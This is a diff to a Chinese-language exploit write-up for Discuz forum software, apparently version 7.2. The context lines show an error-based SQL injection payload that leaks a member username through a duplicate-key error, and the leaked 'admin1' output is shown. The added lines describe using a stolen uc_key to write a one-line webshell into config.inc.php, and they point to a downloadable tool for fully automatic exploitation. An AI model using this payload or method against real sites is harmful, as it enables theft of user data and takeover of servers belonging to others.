@@ -116,9 +116,14 @@ Tags: Discuz
     SQL: SELECT * FROM [Table]usergroups u LEFT JOIN [Table]admingroups a ON u.groupid=a.admingid WHERE u.groupid IN ('7','\',') and (select 1 from (select count(*),concat((select username from [Table]members limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)#')
     Error: Duplicate entry 'admin1' for key 'group_key'
     Errno.: 1062
-    
 
-4、利用上面的思路自己写了一个小软件，可以读取所有的用户用密码
+
+4、写入shell转思路
+
+通过读取uc_key，可以将一句话写入配置文件 `config.inc.php`
+
+
+5、利用上面的思路自己写了一个小软件，可以实现全自动利用
 
 [工具源码下载链接](static/code/diz7.2.py)
 
